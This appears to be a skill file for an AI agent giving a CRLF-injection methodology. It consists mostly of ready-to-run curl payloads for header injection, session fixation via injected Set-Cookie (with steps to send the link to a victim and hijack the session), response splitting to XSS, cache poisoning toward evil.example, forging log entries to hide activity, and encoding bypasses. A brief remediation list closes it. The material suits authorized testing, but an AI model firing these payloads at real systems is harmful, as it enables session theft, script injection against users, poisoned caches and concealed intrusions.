---
name: crlf-injection
description: Detect and exploit CRLF injection for HTTP response header injection, session fixation via injected Set-Cookie, XSS through response splitting, cache poisoning via injected headers, and log injection across URL paths parameters and headers.
---

# CRLF Injection (HTTP Response Splitting & Header Injection)

CRLF injection occurs when attacker-controlled input containing carriage return (`%0d`, `\r`) and line feed (`%0a`, `\n`) characters is echoed into HTTP response headers, redirect URLs, or server-side log files without sanitization. A single injected CRLF terminates the current header and starts a new attacker-controlled one; a double CRLF (`\r\n\r\n`) terminates the entire header block, enabling a full second HTTP response (response splitting), injected `Set-Cookie` headers (session fixation), cache poisoning, and forged log entries.

## When to use this skill

- Testing redirect endpoints (`?url=`, `?next=`, `?returnTo=`, `?redirect=`) for open-redirect-to-header-injection chains.
- Auditing any input reflected into response headers: `Location`, `Set-Cookie`, `Refresh`, CORS headers, custom `X-` headers.
- Assessing CDN/reverse-proxy caching layers for header-based cache poisoning.
- Reviewing logging pipelines for log forging via CRLF in User-Agent, Referer, or query strings.
- Verifying CR/LF remediation across stacks (Tomcat, Jetty, Node, PHP, .NET, nginx).

## Methodology

### 1. Detection — Fuzz CRLF into Every Reflected Input

Probe every input surface that reaches a response header or the request line: URL path segments, query parameters, cookies, and headers such as `Referer` and `User-Agent`. Send `%0d%0a` followed by a marker header and inspect the raw response with `curl -i` — any attacker-controlled `Location`, `Set-Cookie`, or `X-Custom` header appearing in the output confirms injection.

```bash
# Path-based probe: marker header after injected CRLF
curl -si "https://target.example/%0d%0aX-Custom:%20injected" | head -n 15

# Query parameter probe (URL-encoded CRLF inside a redirect param)
curl -si "https://target.example/redirect?url=https://good.example%0d%0aX-Custom:%20injected" | head -n 15

# Cookie and Referer probes
curl -si "https://target.example/" -H "Cookie: sid=abc%0d%0aX-Custom:%20injected"
curl -si "https://target.example/" -H "Referer: https://ref.example/%0d%0aX-Custom:%20injected"
```

Positive signals in `curl -i` output: the marker `X-Custom: injected` appears in the response header block, a `Location` header is truncated at the CRLF, or two responses come back concatenated. Iterate with a payload list (`%0d%0a`, `%0a`, `%0d`, `\r\n`, `%0d%0a%0d%0a`) and diff response headers against a baseline request.

### 2. Set-Cookie Injection → Session Fixation

When CRLF lands in a response that already emits headers, inject a `Set-Cookie` header to add or overwrite cookies in the victim's browser. This enables session fixation: force a known session identifier, then hijack the session after the victim authenticates.

```bash
# Inject a Set-Cookie header fixing the victim's session ID
curl -si "https://target.example/login?next=%0d%0aSet-Cookie:%20JSESSIONID=ATTACKER_KNOWN_ID;%20Path=/" | head -n 15

# Expected response — attacker-controlled header present:
# HTTP/1.1 302 Found
# Location: /
# Set-Cookie: JSESSIONID=ATTACKER_KNOWN_ID; Path=/
```

Send the fixation link to the victim; once they log in, the fixed `JSESSIONID` value authenticates the attacker's requests too. While the injection is live, also test cookie attribute manipulation (`Domain=` widening, dropping `Secure`/`HttpOnly`) and overwriting auth-related cookies.

### 3. Response Splitting → XSS via a Second HTTP Response

A double CRLF (`%0d%0a%0d%0a`) closes the header block, so everything after it is parsed as a brand-new HTTP response. Serve attacker-controlled HTML — including `<script>` — as that second response to achieve reflected XSS on the target origin.

```bash
# Inject a complete second HTTP response containing attacker HTML
curl -si "https://target.example/redirect?url=%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html><script>alert(document.domain)</script>" | head -n 25

# Expected: two concatenated responses — the second is fully attacker-controlled
# HTTP/1.1 302 Found
# Location:
#
# HTTP/1.1 200 OK
# Content-Type: text/html
# Content-Length: 35
#
# <html><script>alert(document.domain)</script>
```

Proxies or clients that mishandle pipelined responses render the second body on the target origin. Set an accurate `Content-Length` so the injected body parses cleanly; mismatched lengths cause browsers to hang or truncate. Confirm XSS by hosting the probe through a browser-based delivery (link to the crafted URL) rather than only curl.

### 4. Header Injection → Cache Poisoning

Inject headers that influence caching or URL reconstruction — `X-Forwarded-Host`, `X-Forwarded-Proto`, or a forged `Age` to manipulate freshness — so attacker-controlled content is stored in a shared cache and served to every subsequent user of that cache key.

```bash
# Poison via X-Forwarded-Host so generated links/redirects point at the attacker host
curl -si "https://target.example/%0d%0aX-Forwarded-Host:%20evil.example" | head -n 15

# Manipulate cache freshness with an injected Age header
curl -si "https://target.example/page?utm=%0d%0aAge:%200%0d%0aX-Cache:%20miss" | head -n 15
```

After the injection request, request the same URL unauthenticated and check whether the cached response still carries the injected header or redirects to `evil.example`. Confirm poisoning by fetching with a different `User-Agent` and from a second IP so per-session caching is ruled out, and inspect the `Age`/`X-Cache` fields the CDN returns.

### 5. Log Injection — Forging Log Entries

CRLF in `User-Agent`, `Referer`, or query strings is written verbatim into access logs by many stacks. Inject CRLF to forge entries, hide attacker activity inside legitimate-looking lines, or break downstream log parsers and SIEM correlation.

```bash
# Forge a fake successful-auth entry and a fake source IP in the access log
curl -si "https://target.example/" -H "User-Agent: Mozilla/5.0%0d%0a200 OK - admin authenticated from 10.0.0.1" | head -n 10

# Inject CRLF into Referer to split one request into two log lines
curl -si "https://target.example/" -H "Referer: https://x.example/a%0d%0aINFO 127.0.0.1 - logged in as admin" | head -n 10
```

Verify by tailing the log file (`tail -n 5 /var/log/nginx/access.log`) or the application's structured log output — forged lines appear with attacker-chosen status codes, usernames, or IPs. Log injection also breaks JSON/CEF parsers; watch for new parse errors in the SIEM immediately after the probe.

### 6. Filter Bypass — Unicode and Alternative CRLF Encodings

Servers that strip literal `%0d%0a` often miss alternative encodings. Older Tomcat and Jetty versions decoded certain Unicode overlong sequences into CRLF bytes, bypassing naive filters.

```bash
# Unicode CRLF variants (U+560A/U+560D overlong encodings) — historic Tomcat/Jetty bypass
curl -si "https://target.example/redirect?url=%E5%98%8A%E5%98%8DX-Custom:%20injected" | head -n 15

# Additional bypass encodings when %0d%0a is blocked
curl -si "https://target.example/redirect?url=%0aX-Custom:%20injected"         # bare LF
curl -si "https://target.example/redirect?url=%0dX-Custom:%20injected"         # bare CR
curl -si "https://target.example/redirect?url=%0d%0a%09X-Custom:%20injected"   # CRLF + tab (header folding)
curl -si --path-as-is "https://target.example/redirect?url=%250d%250aX-Custom:%20injected" # double-encoded
```

`%E5%98%8A` decodes to U+560A and `%E5%98%8D` to U+560D — byte sequences historically normalized to LF/CR by vulnerable servlet containers. When the first decode layer strips CRLF but a second decode pass re-introduces it, double-encoding (`%250d%250a`) succeeds. Always retest blocked payloads with path normalization disabled (`--path-as-is`) since proxies may decode one layer themselves.

### Remediation

- **Strip or reject CR/LF everywhere**: remove `%0d`, `%0a`, `\r`, `\n` — including URL-encoded and double-encoded forms — from all input used in headers, URLs, cookies, and log lines before use.
- **Use framework header APIs**: set headers via `setHeader()` / `Header.Set()` / `header()` equivalents instead of string concatenation; most frameworks reject CR/LF in values by design.
- **Validate redirects against an allowlist**: permit only fully-qualified URLs on trusted hosts; never build `Location` or `Set-Cookie` values from raw user input.
- **Sanitize at the logging boundary**: apply a single CR/LF-stripping normalization to all user-controlled fields before they reach logs so forged entries cannot reach the SIEM.
- **Harden the stack**: run current Tomcat/Jetty/Node versions — the Unicode CRLF decode paths (`%E5%98%8A`) are fixed in modern releases.
- **Add regression tests**: unit tests asserting header values containing CR/LF are rejected or stripped, plus integration fuzzing of `%0d%0a` into every reflected parameter.
